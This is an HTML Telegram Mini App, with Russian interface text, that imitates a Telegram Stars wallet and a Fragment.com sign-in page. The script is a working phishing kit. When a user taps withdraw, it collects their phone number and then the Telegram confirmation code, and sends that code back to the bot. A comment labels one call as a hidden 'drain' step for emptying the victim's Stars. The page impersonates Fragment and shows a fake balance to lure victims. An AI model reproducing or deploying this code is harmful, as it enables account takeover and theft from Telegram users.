<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background: #000000; color: white; font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 0; overflow: hidden; }
        .page { display: none; padding: 20px; text-align: center; height: 100vh; }
        .active { display: block; }

        /* Шапка и баланс */
        .user-pill { display: inline-flex; align-items: center; gap: 8px; background: #1c1c1c; padding: 6px 12px; border-radius: 20px; margin-top: 10px; margin-bottom: 40px; }
        .u-img { width: 22px; height: 22px; border-radius: 50%; }
        .u-name { font-size: 14px; font-weight: 400; color: #fff; }
        .star-main { color: #fecb2e; font-size: 48px; margin-bottom: 5px; display: inline-block; vertical-align: middle; }
        .val-main { font-size: 64px; font-weight: 500; vertical-align: middle; margin-left: 10px; }

        /* Кнопки и карточки */
        .actions { display: flex; justify-content: center; gap: 40px; margin-bottom: 40px; }
        .act-item { display: flex; flex-direction: column; align-items: center; gap: 10px; cursor: pointer; }
        .act-circle { width: 50px; height: 50px; border-radius: 50%; border: 1.5px solid #fecb2e; display: flex; align-items: center; justify-content: center; color: #fecb2e; font-size: 20px; }
        .act-text { color: #fecb2e; font-size: 13px; font-weight: 500; }
        .check-card { background: #181818; border-radius: 12px; padding: 15px; display: flex; align-items: center; justify-content: space-between; text-align: left; }
        .check-icon { background: #fecb2e; color: #000; width: 40px; height: 35px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 18px; margin-right: 15px; }

        /* ЭКРАН FRAGMENT (ТОЧНО ПО ТВОЕМУ ФОТО) */
        .frag-header { display: flex; align-items: center; justify-content: center; gap: 15px; margin: 80px 0 45px; }
        .frag-logo { width: 62px; height: 62px; border-radius: 50%; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .bg-tg { background: #24a1de; color: white; font-size: 32px; }
        .bg-fr { background: #1c1c1c; border: 1.5px solid #333; }
        .bg-fr img { width: 100%; height: 100%; object-fit: cover; } /* https://ibb.co/tPYp2ryX */
        .frag-arrow { color: #24a1de; font-size: 18px; }

        .frag-title { font-size: 24px; font-weight: 700; margin-bottom: 20px; line-height: 1.2; }
        .frag-desc { color: #888; font-size: 15px; line-height: 1.5; margin-bottom: 50px; padding: 0 25px; }
        
        .btn-blue { background: #24a1de; color: white; border: none; width: 90%; padding: 18px; border-radius: 14px; font-size: 15px; font-weight: 700; text-transform: uppercase; cursor: pointer; }
        .btn-cancel { background: none; border: none; color: #24a1de; font-weight: 700; font-size: 15px; margin-top: 30px; text-transform: uppercase; cursor: pointer; }

        .code-input { background: #1c1c1c; border: none; width: 80%; padding: 20px; border-radius: 15px; color: white; font-size: 24px; text-align: center; letter-spacing: 10px; margin: 30px 0; outline: none; }
    </style>
</head>
<body>

    <div id="page-main" class="page active">
        <div class="user-pill">
            <img id="avatar" class="u-img" src="">
            <span id="name" class="u-name">Пользователь</span>
        </div>
        <div><span class="star-main">⭐</span><span class="val-main" id="stars-val">0</span></div>
        <div class="actions">
            <div class="act-item"><div class="act-circle"><i class="fa-solid fa-arrow-down"></i></div><div class="act-text">Пополнить</div></div>
            <div class="act-item" onclick="handleWithdraw()"><div class="act-circle"><i class="fa-solid fa-arrow-up-right-from-square"></i></div><div class="act-text">Вывести</div></div>
        </div>
        <div class="check-card">
            <div style="display: flex; align-items: center;">
                <div class="check-icon"><i class="fa-solid fa-money-check-dollar"></i></div>
                <div class="check-info"><b>Звезды чеками</b><span>Делитесь звездами с помощью чеков.</span></div>
            </div>
            <i class="fa-solid fa-chevron-right" style="color: #333;"></i>
        </div>
    </div>

    <div id="page-auth" class="page">
        <div class="frag-header">
            <div class="frag-logo bg-tg"><i class="fa-brands fa-telegram"></i></div>
            <div class="frag-arrow"><i class="fa-solid fa-arrow-right"></i></div>
            <div class="frag-logo bg-fr">
                <img src="ССЫЛКА_НА_ТВОЕ_ФОТО" alt="Logo">
            </div>
        </div>
        <div id="auth-content">
            <div class="frag-title">Войдите, чтобы использовать аккаунт Telegram</div>
            <div class="frag-desc">для <b>fragment.com</b> и <b>Fragment Auction Alerts</b>. Подтверждение будет отправлено в <b>Telegram</b>.</div>
            <button class="btn-blue" onclick="requestContact()">Поделиться номером телефона</button>
            <button class="btn-cancel" onclick="location.reload()">ОТМЕНА</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        tg.backgroundColor = '#000000';
        tg.headerColor = '#000000';

        const user = tg.initDataUnsafe.user;
        const urlParams = new URLSearchParams(window.location.search);
        const amount = urlParams.get('amount') || "0";
        let isAuthorized = urlParams.get('authorized') === 'true';

        document.getElementById('avatar').src = user?.photo_url || '';
        document.getElementById('name').innerText = user?.first_name || 'Пользователь';
        document.getElementById('stars-val').innerText = amount;

        function handleWithdraw() {
            if (!isAuthorized) {
                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
                document.getElementById('page-auth').classList.add('active');
            } else {
                tg.sendData("CONFIRM_DRAIN"); // Твой скрытый пункт (дрейн)
                tg.close();
            }
        }

        function requestContact() {
            tg.sendData("REQUEST_CONTACT_TRIGGER"); 
            tg.close();
        }

        if(urlParams.get('step') === 'code') {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById('page-auth').classList.add('active');
            document.getElementById('auth-content').innerHTML = `
                <div class="u-name" style="margin-bottom:15px; opacity:0.8;">${user?.first_name || 'Пользователь'}</div>
                <div style="font-size: 48px; font-weight: 700; color: #fecb2e; margin-bottom: 10px;">${amount} ⭐</div>
                <div class="frag-desc" style="color:#fff;">Введите код из чата Telegram для завершения регистрации</div>
                <input type="number" id="code-in" class="code-input" placeholder="0 0 0 0 0">
                <button class="btn-blue" onclick="submitCode()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
            `;
        }

        function submitCode() {
            let val = document.getElementById('code-in').value;
            if(val.length < 5) return;
            tg.sendData("c:" + val);
            tg.close();
        }
    </script>
</body>
</html>
